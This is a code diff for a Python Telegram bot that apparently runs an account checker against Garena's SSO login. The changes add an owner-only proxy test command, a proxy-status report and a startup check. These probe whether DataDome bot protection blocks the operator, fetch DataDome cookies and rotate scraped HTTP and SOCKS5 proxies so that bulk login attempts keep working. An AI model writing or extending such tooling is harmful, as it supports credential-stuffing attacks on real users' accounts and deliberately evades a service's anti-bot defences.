+        file_info = f"{body}\n\n🔢 <b>Total: {total:,} in {len(files)} file(s)</b>"
+    
+    # ── DataDome status ──
+    dd_status = "❌ No cookie"
+    dd = None
+    # Try to get DD from any active checker's datadome_manager
+    for cid, bar_data in _active_bars.items():
+        ls = bar_data.get("live_stats")
+        if ls and hasattr(ls, '_datadome_manager') and ls._datadome_manager:
+            dd = ls._datadome_manager.get_datadome()
+            break
+    if dd:
+        dd_status = f"✅ <code>{dd[:30]}...</code>"
+    
+    # ── Quick connectivity check ──
+    conn_status = "⏳ Checking..."
+    try:
+        resp = requests.get(
+            "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
+            timeout=8, allow_redirects=False
+        )
+        if resp.status_code == 200:
+            conn_status = "✅ Direct OK (no block)"
+        elif resp.status_code == 403:
+            conn_status = "🛡️ DataDome blocked (need proxies!)"
+        else:
+            conn_status = f"⚠️ HTTP {resp.status_code}"
+    except Exception:
+        conn_status = "❌ Cannot reach Garena"
+    
+    # ── SOCKS5 count ──
+    socks_count = sum(1 for p in geo_rotator._proxies if p.startswith("socks"))
+    http_count = pool_size - socks_count
+    
     _tg_send(token, chat_id,
-        f"📡 <b>Proxy Files</b>\n\n"
-        f"{body}\n\n"
-        f"🔢 <b>Total: {total:,} in {len(files)} file(s)</b>"
+        f"📡 <b>Proxy Status</b>\n\n"
+        f"{file_info}\n\n"
+        f"🏊 <b>Pool:</b> {pool_size:,} proxies\n"
+        f"  🌐 HTTP: {http_count:,} · 🔒 SOCKS5: {socks_count:,}\n\n"
+        f"🍪 <b>DataDome:</b> {dd_status}\n\n"
+        f"🔗 <b>Garena SSO:</b> {conn_status}"
     )
 
 
@@ -7355,6 +7640,80 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
         _handle_proxy_status(token, chat_id, from_user)
         return
 
+    if cmd == "testproxy":
+        if not _is_owner(from_user):
+            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+            return
+        # Run connectivity test in background to avoid blocking
+        def _run_proxy_test():
+            results = []
+            # Test direct connection
+            try:
+                resp = requests.get(
+                    "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
+                    timeout=8, allow_redirects=False
+                )
+                if resp.status_code == 200:
+                    results.append("🌐 Direct: ✅ OK (no DataDome block)")
+                elif resp.status_code == 403:
+                    results.append("🌐 Direct: 🛡️ DataDome blocked (403)")
+                else:
+                    results.append(f"🌐 Direct: ⚠️ HTTP {resp.status_code}")
+            except Exception as e:
+                results.append(f"🌐 Direct: ❌ {str(e)[:50]}")
+            
+            # Test DataDome cookie fetch
+            try:
+                sess = requests.Session()
+                sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+                dd = get_datadome_cookie(sess)
+                if dd:
+                    results.append(f"🍪 DataDome: ✅ Cookie obtained")
+                else:
+                    results.append("🍪 DataDome: ❌ Failed to get cookie")
+                sess.close()
+            except Exception as e:
+                results.append(f"🍪 DataDome: ❌ {str(e)[:50]}")
+            
+            # Test a few proxies from the pool
+            pool_size = geo_rotator.total
+            if pool_size > 0:
+                test_count = min(3, pool_size)
+                working = 0
+                tested = 0
+                for i in range(test_count):
+                    try:
+                        proxy_dict = geo_rotator.get_proxies()
+                        if not proxy_dict:
+                            break
+                        sess = requests.Session()
+                        sess.proxies.update(proxy_dict)
+                        sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+                        resp = sess.get(
+                            "https://dd.garena.com/js/",
+                            timeout=6, allow_redirects=False
+                        )
+                        if resp.status_code in (200, 403):
+                            working += 1
+                        tested += 1
+                        sess.close()
+                        geo_rotator.smart_rotate()
+                    except Exception:
+                        tested += 1
+                        geo_rotator.smart_rotate()
+                results.append(f"🔄 Proxies: {working}/{tested} working (pool: {pool_size})")
+            else:
+                results.append("🔄 Proxies: ⚠️ Pool is empty!")
+            
+            _tg_send(token, chat_id,
+                f"🧪 <b>Proxy Connectivity Test</b>\n\n" +
+                "\n".join(results)
+            )
+        
+        threading.Thread(target=_run_proxy_test, daemon=True).start()
+        _tg_send(token, chat_id, "🧪 <b>Running proxy test...</b> (results in ~10s)")
+        return
+
     if cmd == "add_coowner":
         if not _is_primary_owner(from_user):
             _tg_send(token, chat_id, "🚫 <b>Primary owner only command.</b>")
@@ -7996,8 +8355,40 @@ def main():
                 pass
     threading.Thread(target=_railway_heartbeat, daemon=True, name="RailwayHeartbeat").start()
 
-    # ── Raw proxy auto-fetch (every 5 minutes from external sources) ──
+    # ── Raw proxy auto-fetch (every 3 minutes from external sources) ──
     threading.Thread(target=_fetch_raw_proxies, daemon=True, name="RawProxyFetcher").start()
+
+    # ── Startup proxy connectivity diagnostic ──
+    def _startup_proxy_check():
+        """Quick diagnostic: test if Garena SSO is reachable and warn if blocked."""
+        time.sleep(3)  # Wait for proxy fetcher to run first
+        log = logging.getLogger(__name__)
+        pool_size = geo_rotator.total
+        try:
+            # Test direct connection
+            resp = requests.get(
+                "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
+                timeout=8, allow_redirects=False
+            )
+            if resp.status_code == 403:
+                log.warning(f"[STARTUP] 🛡️ Direct IP is DataDome-blocked (403) — proxies REQUIRED")
+                if pool_size == 0:
+                    log.error(f"[STARTUP] ❌ NO PROXIES LOADED + IP BLOCKED = all accounts will fail!")
+                    log.error(f"[STARTUP] 💡 Add working proxies to proxy/ folder or wait for auto-fetch")
+                else:
+                    log.info(f"[STARTUP] ✅ Proxy pool has {pool_size} proxies — should work")
+            elif resp.status_code == 200:
+                log.info(f"[STARTUP] ✅ Direct connection works (no DataDome block)")
+                if pool_size > 0:
+                    log.info(f"[STARTUP] 📦 Proxy pool: {pool_size} proxies available")
+            else:
+                log.info(f"[STARTUP] ℹ️ Garena SSO returned HTTP {resp.status_code}")
+        except Exception as e:
+            log.warning(f"[STARTUP] ⚠️ Cannot reach Garena SSO directly: {e}")
+            if pool_size == 0:
+                log.error(f"[STARTUP] ❌ NO PROXIES + no direct access = checker will fail!")
+
+    threading.Thread(target=_startup_proxy_check, daemon=True, name="ProxyDiagnostic").start()
 
     bot_console.print(
         "[bold green]🤖 Bot is running![/bold green]\n"
